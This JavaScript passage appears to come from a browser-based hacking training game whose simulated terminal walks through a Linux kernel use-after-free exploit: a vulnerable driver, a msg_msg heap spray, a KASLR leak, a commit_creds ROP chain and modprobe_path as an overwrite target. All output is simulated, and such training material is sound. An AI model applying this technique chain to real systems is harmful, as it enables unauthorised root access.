    // Print symbol
    if (gdbCmd === 'p' || gdbCmd === 'print') {
      const sym = args[0];
      const symbols = {
        'commit_creds': '0xffffffff810a9c70',
        'prepare_kernel_cred': '0xffffffff810a9f50',
        'modprobe_path': '0xffffffff82563d80',
        'core_pattern': '0xffffffff82563e80',
        'init_cred': '0xffffffff82a40460',
        'init_task': '0xffffffff82a10940',
        'current_task': '0xffffffff82c14d00',
        '_text': '0xffffffff81000000',
        'kmalloc': '0xffffffff81200000',
        'kfree': '0xffffffff81200100',
        'global_obj': state.allocatedObject ? '0xffff888012345000' : '0x0'
      };

      if (symbols[sym]) {
        print(`$1 = (void *) ${symbols[sym]} <${sym}>`, 'success');
        if (sym === 'modprobe_path') {
          print('  → "/sbin/modprobe"  ; TARGET for overwrite!', 'warning');
        }
      } else {
        print(`No symbol "${sym}" in current context.`, 'error');
      }
      print('(gdb) ', 'warning');
      return;
    }

    // Info registers
    if (gdbCmd === 'info' && args[0] === 'registers') {
      print('rax            0xffffffff81234567  -2128392825', 'system');
      print('rbx            0xffff888012345000  -131941258141696', 'system');
      print('rcx            0x0                 0', 'system');
      print('rdx            0x0                 0', 'system');
      print('rsi            0x1337              4919', 'success');
      print('rdi            0xffff888011111000  -131941271527424', 'system');
      print('rbp            0xffffc90000003f50  0xffffc90000003f50', 'system');
      print('rsp            0xffffc90000003f30  0xffffc90000003f30', 'system');
      print('r8             0x0                 0', 'system');
      print('r9             0x0                 0', 'system');
      print('rip            0xffffffffc0001018  0xffffffffc0001018 <vuln_driver_ioctl+24>', 'warning');
      print('eflags         0x246               [ PF ZF IF ]', 'system');
      print('cs             0x10                16', 'system');
      print('ss             0x18                24', 'system');
      print('(gdb) ', 'warning');
      return;
    }

    // Info proc mappings
    if (gdbCmd === 'info' && args[0] === 'proc') {
      print('Mapped kernel memory regions:', 'info');
      print('          Start Addr           End Addr       Size     Offset  Perms', 'system');
      print('      0xffffffff81000000  0xffffffff82800000  0x1800000        0x0  r-xp   ; kernel text', 'success');
      print('      0xffffffff82800000  0xffffffff82a00000  0x200000   0x1800000  r--p   ; kernel rodata', 'system');
      print('      0xffffffff82a00000  0xffffffff82c00000  0x200000   0x1a00000  rw-p   ; kernel data', 'warning');
      print('      0xffffffffc0000000  0xffffffffc0010000  0x10000          0x0  r-xp   ; vuln_driver.ko', 'error');
      print('      0xffff888000000000  0xffffc88000000000               direct map', 'system');
      print('(gdb) ', 'warning');
      return;
    }

    // Backtrace
    if (gdbCmd === 'bt' || gdbCmd === 'backtrace') {
      print('#0  vuln_driver_ioctl (file=0xffff888011111000, cmd=0x1337, arg=0x0)', 'warning');
      print('    at /home/build/vuln_driver/vuln_driver.c:42', 'system');
      print('#1  0xffffffff8130a2b5 in do_vfs_ioctl (filp=0xffff888011111000, fd=3,', 'system');
      print('    cmd=4919, arg=0) at fs/ioctl.c:877', 'system');
      print('#2  0xffffffff8130a538 in __x64_sys_ioctl (regs=0xffffc90000003f58)', 'system');
      print('    at fs/ioctl.c:926', 'system');
      print('#3  0xffffffff81c00089 in do_syscall_64 (nr=16, regs=0xffffc90000003f58)', 'system');
      print('    at arch/x86/entry/common.c:50', 'system');
      print('#4  0xffffffff81e00082 in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:120', 'system');
      print('(gdb) ', 'warning');
      return;
    }

    // Set breakpoint
    if (gdbCmd === 'break' || gdbCmd === 'b') {
      const loc = args[0] || 'vuln_driver_ioctl';
      print(`Breakpoint 1 at ${loc}`, 'success');
      print('[*] Note: Breakpoints are simulated in this environment', 'muted');
      print('(gdb) ', 'warning');
      return;
    }

    // vmmap
    if (gdbCmd === 'vmmap') {
      print('Virtual Memory Map:', 'info');
      print('    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA', 'muted');
      print('', 'system');
      print('    0xffffffff81000000 0xffffffff82800000 r-xp  24M   [kernel]', 'success');
      print('    0xffffffff82800000 0xffffffff82a00000 r--p   2M   [kernel rodata]', 'system');
      print('    0xffffffff82a00000 0xffffffff82c00000 rw-p   2M   [kernel data]', 'warning');
      print('    0xffffffffc0000000 0xffffffffc0010000 r-xp  64K   vuln_driver.ko', 'error');
      print('', 'system');
      print('(gdb) ', 'warning');
      return;
    }

    // Unknown GDB command
    print(`Undefined command: "${cmd}". Try "help".`, 'error');
    print('(gdb) ', 'warning');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // KADDR - Look up kernel symbol address
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'kaddr') {
    const symbol = args[0];
    if (!symbol) {
      print('Usage: kaddr <symbol>', 'error');
      print('Example: kaddr commit_creds', 'info');
      return;
    }

    const symbols = {
      'commit_creds': { addr: '0xffffffff810a9c70', desc: 'Apply new credentials to current task' },
      'prepare_kernel_cred': { addr: '0xffffffff810a9f50', desc: 'Prepare kernel credentials (NULL=root)' },
      'modprobe_path': { addr: '0xffffffff82563d80', desc: 'Path to modprobe binary - OVERWRITE TARGET!' },
      'core_pattern': { addr: '0xffffffff82563e80', desc: 'Core dump pattern - alternative overwrite target' },
      'init_cred': { addr: '0xffffffff82a40460', desc: 'Initial credentials (uid=0, gid=0)' },
      'init_task': { addr: '0xffffffff82a10940', desc: 'Initial/idle task struct' },
      '_text': { addr: '0xffffffff81000000', desc: 'Kernel text start (KASLR base)' },
      'kmalloc': { addr: '0xffffffff81200000', desc: 'Kernel memory allocator' },
      'kfree': { addr: '0xffffffff81200100', desc: 'Kernel memory free' },
      'msleep': { addr: '0xffffffff810e5fd0', desc: 'Kernel sleep function' },
      'printk': { addr: '0xffffffff81100000', desc: 'Kernel print function' },
      '__x64_sys_ioctl': { addr: '0xffffffff8130a538', desc: 'System call handler for ioctl' },
      'copy_to_user': { addr: '0xffffffff81300000', desc: 'Copy data to userspace' },
      'copy_from_user': { addr: '0xffffffff81300100', desc: 'Copy data from userspace' }
    };

    if (symbols[symbol]) {
      const { addr, desc } = symbols[symbol];
      print('', 'system');
      if (!state.calculatedKaslr && symbol !== '_text') {
        print(`[!] Warning: KASLR is enabled, addresses may be randomized`, 'warning');
        print(`[!] Leak kernel base first to calculate actual addresses`, 'warning');
        print('', 'system');
      }
      print(`Symbol: ${symbol}`, 'info');
      print(`Address: ${addr}`, 'success');
      print(`Description: ${desc}`, 'muted');
      if (symbol === 'modprobe_path') {
        print('', 'system');
        print('[!] This is the prime target for kernel exploitation!', 'error');
        print('[!] Overwrite with "/tmp/pwn" then trigger unknown binary format', 'error');
      }
      if (symbol === 'commit_creds' || symbol === 'prepare_kernel_cred') {
        print('', 'system');
        print('[*] Classic privesc: commit_creds(prepare_kernel_cred(0))', 'warning');
      }
      print('', 'system');
    } else {
      print(`[!] Symbol "${symbol}" not found`, 'error');
      print('[*] Try: commit_creds, prepare_kernel_cred, modprobe_path, init_cred', 'info');
    }
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // OBJDUMP - Objdump-style driver disassembly
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'objdump') {
    if (!state.analyzedModule) {
      print('[!] Analyze the module first', 'warning');
      return;
    }

    await simulateLoading('Disassembling vuln_driver.ko', 2000);
    print('');
    print('vuln_driver.ko:     file format elf64-x86-64', 'muted');
    print('', 'system');
    print('Disassembly of section .text:', 'info');
    print('', 'system');
    print('0000000000000000 <vuln_driver_init>:', 'info');
    print('   0:   e8 00 00 00 00          call   5 <vuln_driver_init+0x5>', 'system');
    print('   5:   55                      push   %rbp', 'system');
    print('   6:   48 89 e5                mov    %rsp,%rbp', 'system');
    print('   9:   bf 00 00 00 00          mov    $0x0,%edi', 'system');
    print('   e:   e8 00 00 00 00          call   13 <__fentry__>', 'system');
    print('  ...', 'muted');
    print('', 'system');
    print('0000000000000050 <vuln_driver_ioctl>:', 'warning');
    print('  50:   e8 00 00 00 00          call   55 <vuln_driver_ioctl+0x5>', 'system');
    print('  55:   55                      push   %rbp', 'system');
    print('  56:   48 89 e5                mov    %rsp,%rbp', 'system');
    print('  59:   41 54                   push   %r12', 'system');
    print('  5b:   53                      push   %rbx', 'system');
    print('  5c:   81 fe 37 13 00 00       cmp    $0x1337,%esi          ; ALLOC_OBJ', 'success');
    print('  62:   74 30                   je     94 <alloc_handler>', 'system');
    print('  64:   81 fe 38 13 00 00       cmp    $0x1338,%esi          ; FREE_OBJ', 'warning');
    print('  6a:   74 40                   je     ac <free_handler>', 'system');
    print('  6c:   81 fe 39 13 00 00       cmp    $0x1339,%esi          ; USE_OBJ', 'error');
    print('  72:   74 50                   je     c4 <use_handler>', 'system');
    print('  74:   81 fe 3a 13 00 00       cmp    $0x133a,%esi          ; READ_OBJ', 'system');
    print('  7a:   74 60                   je     dc <read_handler>', 'system');
    print('  ...', 'muted');
    print('', 'system');
    print('0000000000000094 <alloc_handler>:', 'info');
    print('  94:   bf 60 00 00 00          mov    $0x60,%edi            ; size = 96', 'success');
    print('  99:   be c0 0c 00 00          mov    $0xcc0,%esi           ; GFP_KERNEL', 'system');
    print('  9e:   e8 00 00 00 00          call   kmalloc', 'system');
    print('  a3:   48 89 05 00 00 00 00    mov    %rax,global_obj(%rip)', 'system');
    print('  aa:   eb 50                   jmp    fc <vuln_driver_ioctl+0xac>', 'system');
    print('', 'system');
    print('00000000000000ac <free_handler>:', 'warning');
    print('  ac:   48 8b 3d 00 00 00 00    mov    global_obj(%rip),%rdi', 'system');
    print('  b3:   e8 00 00 00 00          call   kfree', 'warning');
    print('  b8:   eb 42                   jmp    fc <vuln_driver_ioctl+0xac>', 'system');
    print('  ; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^', 'error');
    print('  ; BUG: No "movq $0, global_obj(%rip)" after kfree!', 'error');
    print('  ; Dangling pointer allows Use-After-Free', 'error');
    print('', 'system');
    print('00000000000000c4 <use_handler>:', 'error');
    print('  c4:   48 8b 05 00 00 00 00    mov    global_obj(%rip),%rax', 'warning');
    print('  cb:   48 85 c0                test   %rax,%rax', 'system');
    print('  ce:   74 2c                   je     fc <vuln_driver_ioctl+0xac>', 'system');
    print('  d0:   48 89 c7                mov    %rax,%rdi', 'system');
    print('  d3:   ff 50 50                call   *0x50(%rax)           ; FUNC PTR CALL!', 'error');
    print('  ; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^', 'error');
    print('  ; VULNERABILITY: Calls function pointer at offset 0x50', 'error');
    print('  ; If object was freed and memory reclaimed, we control this!', 'error');
    print('  d6:   eb 24                   jmp    fc <vuln_driver_ioctl+0xac>', 'system');
    print('', 'system');

    state.reversedIoctl = true;
    autosave();
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // STRUCT - View object structure
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'struct') {
    print('');
    print('struct vuln_obj {', 'system');
    print('    char data[80];           // 0x00 - 0x4F (80 bytes)', 'system');
    print('    void (*func_ptr)(void*); // 0x50 (offset 80) - FUNCTION POINTER', 'error');
    print('    unsigned long flags;     // 0x58 (offset 88)', 'system');
    print('};  // Total size: 96 bytes (kmalloc-96 slab)', 'info');
    print('');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // IOCTL - Interact with driver
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'ioctl') {
    const action = args[0];

    if (action === 'alloc') {
      print('[*] Opening /dev/vuln_driver...', 'system');
      print('[*] ioctl(fd, 0x1337, NULL) - ALLOC_OBJ', 'system');
      await sleep(500);
      print('[+] Object allocated successfully', 'success');
      print('[+] Kernel allocated 96 bytes in kmalloc-96 slab', 'info');

      state.allocatedObject = true;
      autosave();
      return;
    }

    if (action === 'free') {
      if (!state.allocatedObject) {
        print('[!] No object allocated yet', 'error');
        return;
      }

      print('[*] ioctl(fd, 0x1338, NULL) - FREE_OBJ', 'system');
      await sleep(500);
      print('[+] Object freed', 'success');
      print('[!] WARNING: global_obj pointer is now DANGLING!', 'warning');
      print('[!] The freed memory can be reclaimed with controlled data', 'error');

      state.freedObject = true;
      autosave();
      return;
    }

    if (action === 'use') {
      if (!state.freedObject) {
        print('[!] Object not in vulnerable state (need to free first)', 'error');
        return;
      }

      if (!state.heapSprayed || !state.overwrotePtr) {
        print('[*] ioctl(fd, 0x1339, NULL) - USE_OBJ', 'system');
        await sleep(500);
        print('[!] KERNEL PANIC - Attempted to call invalid function pointer', 'error');
        print('[!] The freed memory contained garbage - spray first!', 'warning');
        return;
      }

      print('[*] ioctl(fd, 0x1339, &fake_obj) - USE_OBJ', 'system');
      await sleep(1000);
      print('[+] Function pointer called successfully!', 'success');
      print('[+] ROP chain executed: commit_creds(prepare_kernel_cred(0))', 'success');

      state.triggeredExploit = true;
      autosave();
      return;
    }

    if (action === 'read') {
      if (!state.freedObject) {
        print('[*] ioctl(fd, 0x133A, buf) - READ_OBJ', 'system');
        print('[*] Object data (non-sensitive):', 'system');
        print('    00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00', 'system');
        return;
      }

      if (!state.heapSprayed) {
        print('[*] ioctl(fd, 0x133A, buf) - READ_OBJ', 'system');
        print('[!] Reading freed memory - contains residual data', 'warning');
        print('    Leaked pointer at offset 0: 0xffff888012345678', 'success');
        state.leakedPointer = true;
        autosave();
        return;
      }

      print('[*] Reading sprayed object data...', 'system');
      return;
    }

    print('Usage: ioctl <alloc|free|use|read>', 'error');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // SPRAY - Heap spray with msg_msg
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'spray') {
    if (!state.freedObject) {
      print('[!] Free the object first to create the vulnerability', 'warning');
      return;
    }

    await simulateLoading('Heap spraying with msg_msg', 2000);
    print('');
    print('[*] Creating 100 message queues...', 'system');
    print('[*] Sending messages with controlled data...', 'system');
    print('[*] Message size: 48 bytes (header) + 48 bytes (mtext) = 96 bytes', 'info');
    print('[*] Target slab: kmalloc-96 (same as vuln_obj!)', 'success');
    print('');
    print('╔═══════════════════════════════════════════════════════════════════╗', 'success');
    print('║                    HEAP SPRAY SUCCESSFUL                          ║', 'success');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'success');
    print('║  msg_msg structures sprayed into kmalloc-96 slab                  ║', 'info');
    print('║  High probability of reclaiming freed vuln_obj memory             ║', 'info');
    print('║                                                                   ║', 'info');
    print('║  Our controlled data overwrites:                                  ║', 'warning');
    print('║    offset 0x50 (func_ptr): 0xffffffff81234567 (our ROP gadget)   ║', 'error');
    print('╚═══════════════════════════════════════════════════════════════════╝', 'success');
    print('');

    state.heapSprayed = true;
    state.overwrotePtr = true;
    playAlert();
    autosave();
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // LEAK - Leak kernel pointer for KASLR bypass
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'leak') {
    if (!state.freedObject) {
      print('[!] Create UAF condition first (alloc then free)', 'warning');
      return;
    }

    await simulateLoading('Leaking kernel pointers', 1500);
    print('');
    print('[*] Triggering READ_OBJ on freed memory...', 'system');
    print('[*] Leaked data:', 'success');
    print('    0x0000: ff ff 88 80 12 34 56 78  <- Kernel heap pointer', 'success');
    print('    0x0008: ff ff ff ff 81 23 45 67  <- Kernel text pointer', 'success');
    print('');
    print('[*] Kernel text pointer: 0xffffffff81234567', 'info');
    print('[*] Known symbol offset: 0x234567', 'info');
    print('[*] KASLR base = 0xffffffff81234567 - 0x234567 = 0xffffffff81000000', 'success');
    print('');
    print('╔═══════════════════════════════════════════════════════════════════╗', 'success');
    print('║                    KASLR BYPASS SUCCESSFUL                        ║', 'success');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'success');
    print('║  Kernel base address: 0xffffffff81000000                          ║', 'success');
    print('║  commit_creds:        0xffffffff810a9c70                          ║', 'info');
    print('║  prepare_kernel_cred: 0xffffffff810a9f50                          ║', 'info');
    print('╚═══════════════════════════════════════════════════════════════════╝', 'success');
    print('');

    state.leakedPointer = true;
    state.calculatedKaslr = true;
    state.kernelBase = '0xffffffff81000000';
    playSuccess();
    autosave();
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // EXPLOIT - Run full exploit chain
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'exploit') {
    if (!state.allocatedObject) {
      print('[!] Step 1 missing: ioctl alloc', 'error');
      return;
    }
    if (!state.freedObject) {
      print('[!] Step 2 missing: ioctl free', 'error');
      return;
    }
    if (!state.heapSprayed) {
      print('[!] Step 3 missing: spray', 'error');
      return;
    }
    if (!state.calculatedKaslr) {
      print('[!] Step 4 missing: leak', 'error');
      return;
    }

    print('');
    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'error');
    print('║                         EXECUTING KERNEL EXPLOIT                                 ║', 'error');
    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'error');
    print('');

    print('[*] Stage 1: Preparing ROP chain...', 'system');
    await sleep(500);
    print('[+] ROP gadgets resolved using leaked KASLR base', 'success');

    print('[*] Stage 2: Building fake object with malicious func_ptr...', 'system');
    await sleep(500);
    print('[+] Fake object created with ROP pivot at offset 0x50', 'success');

    print('[*] Stage 3: Triggering USE_OBJ to call our controlled pointer...', 'warning');
    await sleep(1000);
    print('[+] Function pointer called!', 'success');

    print('[*] Stage 4: ROP chain executing...', 'warning');
    await sleep(500);
    print('    → pop rdi; ret', 'system');
    print('    → 0x0 (NULL for init cred)', 'system');
    print('    → prepare_kernel_cred()', 'system');
    print('    → pop rdi; ret', 'system');
    print('    → rax (kernel_cred)', 'system');
    print('    → commit_creds()', 'system');
    print('    → swapgs; iretq', 'system');
    await sleep(500);

    print('');
    print('[+] ROP chain completed! Returning to userspace...', 'success');
    print('');

    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'success');
    print('║                                                                                  ║', 'success');
    print('║   ██████╗  ██████╗  ██████╗ ████████╗    ███████╗██╗  ██╗███████╗██╗     ██╗    ║', 'success');
    print('║   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔════╝██║  ██║██╔════╝██║     ██║    ║', 'success');
    print('║   ██████╔╝██║   ██║██║   ██║   ██║       ███████╗███████║█████╗  ██║     ██║    ║', 'success');
    print('║   ██╔══██╗██║   ██║██║   ██║   ██║       ╚════██║██╔══██║██╔══╝  ██║     ██║    ║', 'success');
    print('║   ██║  ██║╚██████╔╝╚██████╔╝   ██║       ███████║██║  ██║███████╗███████╗███████╗║', 'success');
    print('║   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝║', 'success');
    print('║                                                                                  ║', 'success');
    print('║                   KERNEL EXPLOITATION SUCCESSFUL                                ║', 'success');
    print('║                   uid=0(root) gid=0(root)                                       ║', 'success');
    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'success');
    print('');

    state.triggeredExploit = true;
    state.gotRoot = true;
    state.currentUser = 'root';
    setPrompt('root', 'target', '~');

    addEasterEgg('lvl5_ring0', 'Welcome to Ring 0. The kernel bows to you.');
    playSuccess();
    autosave();
    completeLevel();
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // SHELL COMMANDS
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'whoami') {
    print(state.currentUser, state.currentUser === 'root' ? 'success' : 'system');
    return;
  }

  if (cmd === 'id') {
    if (state.gotRoot) {
      print('uid=0(root) gid=0(root) groups=0(root)', 'success');
    } else {
      print('uid=1000(user) gid=1000(user) groups=1000(user)', 'system');
    }
    return;
  }

  if (cmd === 'uname') {
    print('Linux target 5.15.0-generic #1 SMP x86_64 GNU/Linux', 'system');
    return;
  }

  if (cmd === 'cat') {
    if (args[0] === '/proc/kallsyms') {
      if (!state.gotRoot) {
        print('0000000000000000 T _text', 'system');
        print('0000000000000000 T startup_64', 'system');
        print('[*] Addresses hidden without root', 'warning');
      } else {
        print('ffffffff81000000 T _text', 'success');
        print('ffffffff810a9c70 T commit_creds', 'success');
        print('ffffffff810a9f50 T prepare_kernel_cred', 'success');
      }
      return;
    }

    if (args[0] === '/etc/passwd') {
      print('root:x:0:0:root:/root:/bin/bash', 'system');
      print('user:x:1000:1000::/home/user:/bin/bash', 'system');
      return;
    }

    print(`cat: ${args[0]}: No such file`, 'error');
    return;
  }

  print(`${cmd}: command not found`, 'error');
}

function calculateLevel5Progress(state) {
  let progress = 0;

  // Recon (15%)
  if (state.analyzedModule) progress += 5;
  if (state.foundVuln) progress += 5;
  if (state.reversedIoctl) progress += 5;

  // Exploitation chain (50%)
  if (state.allocatedObject) progress += 10;
  if (state.freedObject) progress += 10;
  if (state.heapSprayed) progress += 10;
  if (state.leakedPointer) progress += 10;
  if (state.calculatedKaslr) progress += 10;

  // Privesc (35%)
  if (state.overwrotePtr) progress += 10;
  if (state.triggeredExploit) progress += 10;
  if (state.gotRoot) progress += 15;

  return Math.min(progress, 100);
}
</script>
